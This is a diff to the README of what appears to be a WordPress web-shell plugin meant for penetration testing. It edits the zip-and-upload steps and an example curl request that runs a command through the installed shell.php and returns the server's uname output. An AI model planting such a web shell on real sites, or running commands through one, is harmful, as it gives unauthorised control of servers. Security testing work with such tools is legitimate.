@@ -12,10 +12,10 @@ To install the shell, we are assuming you have administrative access to the Word
 Either upload the zip file located in the `dist/` directory, or create your own archive with:
 
 ```bash
-λ wordpress-shell → λ git master → zip -r shell.zip shell.php
+$ zip -r shell.zip shell.php
   adding: shell.php (deflated 39%)
   
-λ wordpress-shell → λ git master → ls -lah shell.zip
+$ ls -lah shell.zip
 -rw-r--r--  1 bob  staff   492B Aug 29 14:17 shell.zip
 ```
 
@@ -44,7 +44,6 @@ root@kali:~# curl -v "http://192.168.0.1/wp-content/plugins/shell/shell.php?$(py
 < Vary: Accept-Encoding
 < Content-Length: 191
 < Content-Type: text/html
-< 
+
 Linux wordpress-server 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
-* Connection #0 to host 192.168.0.1 left intact
 ```
